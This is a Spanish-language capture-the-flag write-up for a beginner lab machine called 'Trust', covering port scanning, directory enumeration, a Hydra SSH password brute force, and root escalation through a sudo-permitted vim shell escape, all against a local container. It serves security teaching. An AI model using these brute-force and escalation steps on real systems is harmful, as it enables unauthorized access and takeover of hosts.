
# 1. Máquina: Trust  

*Write Up*

<a href="https://github.com/GutsNet"><img title="Author" src="https://img.shields.io/badge/Author-GutsNet-red.svg?style=for-the-badge&logo=github"></a>

**Dificultad:** Muy Fácil

**Proceso:**
- [1. Despliegue](#desplegando-la-máquina-vulnerable)
- [2. Escaneo de puertos](#escaneo-de-puertos-con-nmap)
- [3. Enumeración de Directorios](#enumeración-de-directorios-con-gobuster)
- [4. Visualización de Contenido](#visualización-de-contenido-con-curl)
- [5. Ataque de fuerza bruta](#fuerza-bruta-ssh-con-hydra)
- [6. Acceso con SSH](#acceso-al-servidor-ssh)
- [7. Busqueda de privilegios](#enumeración-de-privilegios-sudo)
- [8. Escalada de privilegios](#escalada-de-privilegios-con-vim)

---

## Desplegando la Máquina Vulnerable

```bash
~/Trust ᐅ sudo bash auto_deploy.sh trust.tar
```
Este comando ejecuta un script de bash (`auto_deploy.sh`) que despliega la máquina vulnerable a partir del archivo `trust.tar`.

**Salida:**

```
Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.18.0.2
Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

#### Verificación de Conectividad

```bash
~/Trust ᐅ ping -c 2 172.18.0.2
```
El comando `ping -c 2` envía 2 paquetes ICMP a la dirección IP `172.18.0.2` para verificar la conectividad y la respuesta del host.

**Salida:**

```
PING 172.18.0.2 (172.18.0.2) 56(84) bytes of data.
64 bytes from 172.18.0.2: icmp_seq=1 ttl=64 time=0.441 ms
64 bytes from 172.18.0.2: icmp_seq=2 ttl=64 time=0.076 ms

--- 172.18.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1022ms
rtt min/avg/max/mdev = 0.076/0.258/0.441/0.182 ms
```

---

## Escaneo de Puertos con Nmap

```bash
~/Trust ᐅ nmap -p- -sCV 172.18.0.2
```
Este comando revela que los puertos `22` (SSH) y `80` (HTTP) están abiertos, con `OpenSSH` y `Apache` ejecutándose en ellos respectivamente.

**Salida:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
```

**Explicación de parámetros:**

- `-p-`: Escanea todos los puertos (del 1 al 65535).
- `-sCV`: Realiza un escaneo con detección de versión (`-sV`) y utiliza scripts básicos (`-sC`) para obtener más información del servicio.

---

## Enumeración de Directorios con Gobuster

```bash
~/Trust ᐅ gobuster dir -w $seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://172.18.0.2:80/ -t 200 -x php,html
```
Este comando encuentra dos archivos en el servidor web: `index.html` y `secret.php`.

**Salida:**

```
/index.html           (Status: 200) [Size: 10701]
/secret.php           (Status: 200) [Size: 927]
```

**Explicación de parámetros:**

- `dir`: Modo de enumeración de directorios.
- `-w`: Especifica la wordlist a utilizar.
- `-u`: URL objetivo a escanear.
- `-t 200`: Define el número de hilos a usar (200 en este caso).
- `-x php,html`: Busca archivos con extensiones `.php` y `.html`.

---

## Visualización de Contenido con cURL

```bash
~/Trust ᐅ curl http://172.18.0.2/secret.php
```

**Salida:**

```html
<!DOCTYPE html>
```         	                                                                                                                	              

El comando `curl` se utiliza para ver el contenido del archivo `secret.php`, el cual es HTML, o bien, la otra y la mejor opción, es abrir el archivo desde el navegador (http://172.18.0.2/secret.php). En este caso, lo hice a través de comandos por comodidad y para dar un vistazo.

---

## Fuerza Bruta SSH con Hydra

```bash
~/Trust ᐅ hydra -l mario -P $seclists/Passwords/probable-v2-top12000.txt ssh://172.18.0.2 -I -t 32
```

**Salida:**

```
[22][ssh] host: 172.18.0.2   login: mario   password: chocolate
1 of 1 target successfully completed, 1 valid password found
```

Hydra encuentra la contraseña `chocolate` para el usuario `mario`. Dicho usuario se encontro en la ruta http://172.18.0.2/secret.php.

**Explicación de parámetros:**
- `-l mario`: Define el usuario como `mario`.
 - `-P`: Especifica la wordlist de contraseñas.
 - `ssh://172.18.0.2`: Define el protocolo y la IP del objetivo.
- `-I`: Ejecuta el ataque inmediatamente sin demora.
- `-t 32`: Utiliza 32 tareas en paralelo.

---

## Acceso al Servidor SSH

```bash
~/Trust ᐅ  mario@172.18.0.2
```

Este comando inicia una sesión SSH en la máquina como el usuario `mario`.

**Salida:**
 ```
mario@172.18.0.2's password:
Linux 73cbcae3fd14 5.15.153.1-microsoft-standard-WSL2 #1 SMP Fri Mar 29 23:14:13 UTC 2024 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Mar 20 09:54:46 2024 from 192.168.0.21
mario@73cbcae3fd14:~$ 
```

**Comprobación:**
```
mario@73cbcae3fd14:~$ whoami
mario
```

---

## Enumeración de Privilegios Sudo

```bash
mario@73cbcae3fd14:~$ sudo -l
 ```

Este comando muestra que el usuario `mario` tiene permisos para ejecutar `vim` con privilegios de superusuario.

**Salida:**

```
Matching Defaults entries for mario on 73cbcae3fd14:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on 73cbcae3fd14:
    (ALL) /usr/bin/vim
```

---

## Escalada de Privilegios con Vim

#### Búsqueda de técnicas de escalada de privilegios con <a href="https://github.com/r1vs3c/searchbins">Searchbins</a>

```bash
~/Trust ᐅ searchbins -b vim -f sudo
```

Searchbins sugiere varias técnicas para escalar privilegios utilizando `vim`.

**Salida:**
```
[+] Binary: vim

================================================================================
[*] Function: sudo -> [https://gtfobins.github.io/gtfobins/vim/#sudo]

        | sudo vim -c ':!/bin/sh'

This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.

        | sudo vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

This requires that `vim` is compiled with Lua support.

        | sudo vim -c ':lua os.execute("reset; exec sh")'
```

#### Ejecución de la Escalada de Privilegios

```bash
mario@73cbcae3fd14:~$ sudo vim -c ':!/bin/sh'
```

Este comando utiliza `vim` con privilegios de superusuario para ejecutar un shell con permisos de root.

**Salida:**
```

# 
```

**Comprobación:**
```

# whoami
root
```

